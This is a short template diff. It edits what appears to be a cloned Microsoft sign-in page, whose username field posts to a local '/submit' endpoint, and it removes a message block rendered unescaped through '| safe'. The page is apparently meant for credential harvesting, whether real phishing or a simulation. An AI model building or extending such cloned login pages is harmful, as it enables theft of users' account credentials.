@@ -97,10 +97,7 @@
                                                   hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
                                               event: {
                                                   updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
-                                                      <br>
-                                                      {% if message %}
-                                                      <p class = "message"> {{ message | safe}}</p>
-                                                        {% endif %}
+
                                                 <form action="/submit" method="POST">
                                                   <input name="username" id="i0116" maxlength="113" class="form-control ltr_override" aria-required="true" data-bind="
                                                       css: { 'has-error': usernameTextbox.error },
